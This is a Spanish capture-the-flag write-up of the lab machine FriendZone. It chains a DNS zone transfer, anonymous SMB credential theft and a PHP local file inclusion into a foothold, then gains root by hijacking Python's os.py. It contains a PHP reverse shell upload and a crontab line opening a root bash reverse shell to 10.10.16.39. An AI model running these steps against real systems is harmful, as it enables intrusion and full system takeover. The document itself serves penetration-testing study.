fase 1

Reconocimiento

Nmap

Escaneo completo de puertos:

bash
❯ nmap -p- --open -sCV -T4 -Pn -n 10.129.45.67 -oN scaneonmap.txt -vvv

Resultado relevante:

output
PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 53/tcp open domain ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu) 80/tcp open http Apache httpd 2.4.29 (Ubuntu) |_http-title: Friend Zone Escape software 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 443/tcp open ssl/http Apache httpd 2.4.29 | ssl-cert: Subject: commonName=friendzone.red 445/tcp open netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)

Mucha superficie de ataque: FTP, SSH, DNS, HTTP/HTTPS y SMB. El certificado SSL del puerto 443 revela el commonName=friendzone.red — un dominio real que podemos investigar.

DNS Zone Transfer

Con el puerto 53 abierto y un dominio identificado, probamos una transferencia de zona AXFR. Si el servidor DNS está mal configurado, nos devolverá todos los registros de la zona, incluyendo subdominios internos:

bash
❯ dig axfr friendzone.red @10.129.45.67 friendzone.red. 604800 IN SOA localhost. root.localhost. ... friendzone.red. 604800 IN A 127.0.0.1 administrator1.friendzone.red. 604800 IN A 127.0.0.1 hr.friendzone.red. 604800 IN A 127.0.0.1 uploads.friendzone.red. 604800 IN A 127.0.0.1
⚡ Hallazgo

Tres subdominios nuevos: administrator1, hr y uploads. Como todos apuntan a 127.0.0.1, lo más probable es que sean virtual hosts servidos por el mismo Apache.

Los añadimos a /etc/hosts para poder resolverlos:

/etc/hosts
10.129.45.67 friendzone.red administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red

SMB

Con el puerto 445 abierto, enumeramos los recursos compartidos con enum4linux:

bash
❯ enum4linux 10.129.45.67 Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers Files Disk FriendZone Samba Server Files /etc/Files general Disk FriendZone Samba Server Files Development Disk FriendZone Samba Server Files IPC$

Tres recursos interesantes. Probamos a conectar sin autenticación (-N) con smbclient:

bash
# recurso "general" ❯ smbclient -N \\\\10.129.45.67\\general smb: \> dir creds.txt N 57 Wed Oct 10 01:52:42 2018 smb: \> get creds.txt # contenido de creds.txt creds for the admin THING: admin:WORKWORKHhallelujah@#
⚡ Credenciales obtenidas

El recurso general es de solo lectura y contiene creds.txt con credenciales admin:WORKWORKHhallelujah@#. El recurso Development está vacío pero permite escritura — lo aprovecharemos más adelante.

Vhosts HTTPS

El puerto 443 sirve contenido distinto al 80. Aceptamos el certificado autofirmado y enumeramos directorios sobre el vhost administrator1.friendzone.red (-k para ignorar errores de certificado):

bash
❯ gobuster dir -u https://administrator1.friendzone.red/ \ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \ -x .php -t 50 -k /login.php /dashboard.php /timestamp.php

Con las credenciales admin:WORKWORKHhallelujah@# obtenidas del SMB iniciamos sesión y accedemos al dashboard:

administrator1.friendzone.red/dashboard.php

El mensaje indica que la página renderiza contenido a partir de un parámetro image_id y pagename, y que es un script PHP poco probado — señal de alarma. La sintaxis por defecto sugerida es image_id=a.jpg&pagename=timestamp.

fase 2

Explotación

LFI vía dashboard.php

Probamos a manipular el parámetro pagename apuntando a un archivo PHP que sabemos que existe (login), para comprobar si el script lo incluye y ejecuta dinámicamente:

url
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=login
Resultado: ejecuta login.php → "Wrong!"
⚡ LFI confirmada

El parámetro pagename se concatena a una ruta y se incluye con algo equivalente a include($pagename . '.php'). Esto es un Local File Inclusion — y si conseguimos colocar un archivo PHP en cualquier ruta del sistema, podemos ejecutarlo apuntando pagename a esa ruta (sin extensión .php, ya que el script la añade).

Recordamos que el recurso SMB Files tenía el comentario "FriendZone Samba Server Files /etc/Files", lo que revela que los shares SMB están montados bajo /etc/. Por tanto, Development probablemente está en /etc/Development — y ahí sí tenemos permisos de escritura.

fase 3

Foothold

Subimos una reverse shell PHP al recurso Development vía SMB:

bash
❯ smbclient -N \\\\10.129.45.67\\Development smb: \> put php-reverse-shell.php putting file php-reverse-shell.php as \php-reverse-shell.php

Nos ponemos en escucha y disparamos el LFI apuntando a la ruta del archivo subido (sin extensión, ya que el script la añade):

bash
❯ nc -nlvp 4444
url
https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/php-reverse-shell
nc recibiendo la conexión como www-data

Tenemos shell como www-data. Hacemos el tratamiento de TTY y leemos la flag de usuario:

bash
$ python -c "import pty; pty.spawn('/bin/bash')" www-data@FriendZone:/$ cat /home/friend/user.txt
fase 4

Escalada de privilegios

Enumeración con pspy

Subimos pspy64 vía el mismo recurso SMB escribible y lo copiamos a /tmp:

bash
www-data@FriendZone:/tmp$ cp /etc/Development/pspy64s . www-data@FriendZone:/tmp$ ./pspy64s CMD: UID=0 PID=2192 | /usr/bin/python /opt/server_admin/reporter.py CMD: UID=0 PID=2191 | /bin/sh -c /opt/server_admin/reporter.py

Un script Python se ejecuta periódicamente como root. Al revisar el código de reporter.py no encontramos nada explotable directamente — pero importa el módulo estándar os.

LinEnum — permisos de escritura

Ejecutamos LinEnum.sh de la misma forma, buscando archivos escribibles por cualquier usuario:

bash
www-data@FriendZone:/tmp$ ./LinEnum.sh -t 1 [-] World-writable files (excluding /proc and /sys): -rwxrwxrwx 1 root root 25910 Jan 15 2019 /usr/lib/python2.7/os.py
💀 Python Module Hijacking

El módulo os.py de la librería estándar de Python 2.7 tiene permisos 777 — cualquier usuario puede sobrescribirlo. Como reporter.py se ejecuta como root y hace import os, si reemplazamos ese archivo, nuestro código se ejecutará con privilegios de root la próxima vez que el cron dispare el script.

Explotación: sobreescritura de os.py

Creamos un os.py malicioso que, al ser importado, añade una entrada al crontab que nos envía una reverse shell como root:

python
shell = '\n* * * * * root /bin/bash -c "bash -i >& /dev/tcp/10.10.16.39/4445 0>&1"\n' f = open('/etc/crontab', 'w') f.write(shell) f.close()

Lo subimos a través del recurso SMB Development y lo copiamos a la ubicación del módulo, reemplazando el original:

bash
www-data@FriendZone:/tmp$ cp /etc/Development/os.py /usr/lib/python2.7/os.py # nos ponemos en escucha en otro puerto ❯ nc -nlvp 4445

En menos de un minuto, el cron ejecuta reporter.py como root, este hace import os, ejecuta nuestro código malicioso, sobreescribe /etc/crontab y la siguiente ejecución del cron nos envía una shell como root. Flag en /root/root.txt.

takeaways

Lecciones aprendidas

01
Las transferencias de zona DNS (AXFR) revelan infraestructura interna
Siempre que veas el puerto 53 abierto y conozcas un dominio (por ejemplo, en un certificado SSL), prueba dig axfr dominio @ip. Un servidor mal configurado puede revelar subdominios y vhosts que de otra forma serían invisibles.
02
Los comentarios de SMB revelan rutas del sistema de archivos
El comentario "FriendZone Samba Server Files /etc/Files" en enum4linux nos dijo dónde estaban montados los shares. Razonar por analogía (Files → /etc/Files, entonces Development → /etc/Development) fue la clave para encadenar el SMB con el LFI.
03
Un LFI + un recurso de escritura = RCE
Por sí solo, un LFI solo lee archivos existentes. Pero si además puedes escribir un archivo en cualquier ruta accesible por el servidor (vía SMB, FTP, upload, etc.), el LFI se convierte en ejecución remota de código.
04
Module hijacking en Python 2: revisa permisos de /usr/lib/python2.7/
Si un script que corre como root importa módulos estándar (os, sys, etc.) y esos módulos tienen permisos de escritura para tu usuario, puedes sobrescribirlos para ejecutar código arbitrario con privilegios elevados. Herramientas como pspy son esenciales para detectar qué se ejecuta como root y cuándo.
